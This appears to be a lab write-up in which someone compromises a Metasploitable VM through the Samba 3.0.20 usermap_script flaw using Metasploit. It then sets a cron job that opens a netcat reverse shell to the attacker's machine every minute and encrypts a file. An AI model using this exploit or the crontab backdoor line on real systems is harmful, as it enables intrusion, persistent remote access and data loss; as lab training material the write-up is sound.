# Exploiting `samba`


### Reconnaissance
- Netdiscover to identify IP Address of Metasploitable (Target) VM 
- A bash script running nmap scans to identify: 
    - Open Ports 
    - Services 
    - Versions 
    - Operating System

- Identified Port 139 and 445 are open and running SMB v3.x to 4.x

- enum4linux-ng to enumerate Samba shares 
- Identified version as 3.0.20 which is vulnerable to 'Username' map script' Command Execution

### Weaponization
- Used Metasploit Framework to automate the exploit 
- The exploit used is usermap_script 
- Metaploit path is `exploit/multi/samba/usermap_script`
- Default payload was used

```bash 
msfconsole 
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.56.105 # Target IP
set LHOSTS 192.168.56.106 # Kali IP
```

### Delivery
- Ran exploit 

```bash 
run 
```

### Exploitation 
- The exploit provides a shell with root privileges 
- Confirmed via `whoami`

### Installation 
- Created a cronjob that connects back to Kali machine with shell access 

```bash 
echo "* * * * * nc -e /bin/bash <kali_ip> 4444" >> /etc/crontab
```

### Command And Control 
- Even after the Metasploitable machine is rebooted the cronjob will attempt to connect back to the listener

### Actions On Objectives 
- Gained access 
- Created a persistent backdoor 
- Encrypted a file (/home/user/important_file.txt) and removed original 
